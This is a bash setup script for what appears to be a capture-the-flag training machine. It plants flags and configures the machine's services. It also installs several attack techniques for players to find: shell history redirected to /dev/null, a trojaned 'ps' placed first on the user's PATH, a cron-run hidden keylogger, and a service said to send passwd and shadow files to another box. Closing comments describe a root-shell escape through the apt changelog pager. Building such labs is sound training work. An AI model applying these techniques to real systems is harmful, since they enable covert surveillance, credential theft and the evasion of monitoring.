#! /bin/bash

if [ "$EUID" -ne 0 ]
then
    echo "Please run this script with sudo!"
    exit
fi

## install deps for this script - run this separately before everything else
# apt install lsof wget mariadb-server openjdk-8-jdk vsftpd rsync python3 python3-xlib -y

# get tarball
# wget # TODO LINK HERE
tar xvf setup_files.tar.gz

# link csc user .histfile and .bash_history to /dev/null
echo "linking history to /dev/null for csc"
rm /home/csc/.histfile
ln /home/csc/.histfile /dev/null
rm /home/csc/.bash_history
ln /home/csc/.bash_history /dev/null

# link root user .histfile and .bash_history to /dev/null
echo "linking history to /dev/null for root"
rm /root/.histfile
ln /root/.histfile /dev/null
rm /root/.bash_history
ln /root/.bash_history /dev/null

# replace default sshd_config with my sshd_config
echo "replace sshd_config"
rm /etc/ssh/sshd_config
mv ./sshd_config /etc/ssh/

# setup sql server
echo "setup sql server"
systemctl start mariadb.service
systemctl enable mariadb.service

# setup scoring for insecure sql server
echo "setup sql scoring"
chmod +x ./sql_script.sh
mkdir -p /var/www/default
mv sql_script.sh /var/www/default

## make it a cron job!
systemctl start cron.service
systemctl enable cron.service
touch /etc/cron.allow
echo "root" >> /etc/cron.allow
touch /var/spool/cron/root
echo "* * * * * /var/www/default/sql_script.sh" >> /var/spool/cron/root

# setup minecraft server
echo "setup minecraft server"
mkdir /var/www/mcdir
mv minecraft.service /etc/systemd/system/
cd /var/www/mcdir
wget -O minecraft_server.jar https://launcher.mojang.com/v1/objects/f02f4473dbf152c23d7d484952121db0b36698cb/server.jar
chmod +x minecraft_server.jar
echo "eula=true" > eula.txt
cd -
systemctl start minecraft.service
systemctl enable minecraft.service

# setup ftp server
echo "setup ftp server"
rm /etc/vsftpd.conf
mv ./vsftpd.conf /etc/
systemctl start vsftpd.service
systemctl enable vsftpd.service
cd /etc/systemd/system
echo "\n # flag_{not_so_secure_ftp}" >> $(find . -name "vsftpd.service")
cd -

# setup backdoored ps and flag
echo "setup backdoored ps"
mkdir /var/loog
mv /bin/ps /var/loog/backup_ps
chmod +x backdoored_ps.sh
mv backdoored_ps.sh /var/loog/ps
mkdir /var/www/log
mv flag.sh ps_init.sh /var/www/log/
echo "export $PATH=/var/loog/:$PATH" >> /home/csc/.profile
echo "* * * * * /var/www/log/ps_init.sh" >> /var/spool/cron/root

# setup hidden python keylogger
mkdir /opt/local/
mv log.txt /opt/local/
chmod +x log.sh
mv log.sh /usr/local/src/
mv keylogger.py /usr/local/src/
mv pyxhook.py /usr/local/src/
echo "* * * * * /usr/local/src/log.sh" >> /var/spool/cron/root

# setup service that sends logging, passwd, and shadow file to someone else
# TODO: setup dest box to receive files - use static ip UPDATE: not needed - I'll just keep the box on lol
# TODO: setup rsa key on source and dest boxes UPDATE: done!
chmod +x backup.sh
mv backup.sh /var/spool
mv backup.service /etc/systemd/system/
systemctl start backup.service
systemctl status backup.service

# hack back against the backup ssh computer
# flag in /etc/passwd - 
# sudo access to apt
# > apt-get changelog apt gives less pager
# > !# /bin/bash gives root shell
